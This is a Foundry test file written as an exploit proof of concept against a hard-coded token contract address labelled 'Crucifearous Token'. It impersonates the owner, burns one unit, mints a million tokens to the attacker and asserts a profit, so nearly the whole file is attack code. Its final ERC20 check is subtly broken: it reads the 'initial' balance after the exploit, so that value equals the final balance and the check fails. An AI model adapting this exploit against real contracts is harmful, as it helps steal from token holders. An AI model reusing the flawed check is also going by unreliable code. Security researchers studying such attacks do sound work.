// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface CoinToken {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function burn(uint256 _value) external;
    function mint(address account, uint256 amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x6bf3a93793e52f75543c92AfEC4636559988e3c1;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate owner during exploit
        vm.label(TARGET, "Crucifearous Token");

        // Get the current owner of the contract
        address owner = CoinToken(TARGET).owner();
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = CoinToken(TARGET).balanceOf(attacker);
        console.log("Initial balance:", initialBalance);

        // Impersonate the owner (as required by preconditions)
        address owner = CoinToken(TARGET).owner();
        vm.startPrank(owner);

        // Step 1: Burn 1 wei - this burns 1 reflection unit (very small amount)
        // but subtracts 1 token from total supply
        CoinToken(TARGET).burn(1);

        // Step 2: Mint a large amount - this adds amount to both _tTotal and _rOwned
        // Due to reflection rate, adding to _rOwned gives us many more tokens
        CoinToken(TARGET).mint(attacker, 1_000_000 * 1e18);

        vm.stopPrank();

        // Check final balance
        uint256 finalBalance = CoinToken(TARGET).balanceOf(attacker);
        console.log("Final balance:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);

        // Verify we made profit
        assertGt(finalBalance, initialBalance, "Balance should increase");

        // Check ERC20 balance as well
        uint256 erc20FinalBalance = IERC20(TARGET).balanceOf(address(this));
        uint256 erc20InitialBalance = IERC20(TARGET).balanceOf(address(this));
        assertGt(erc20FinalBalance, erc20InitialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
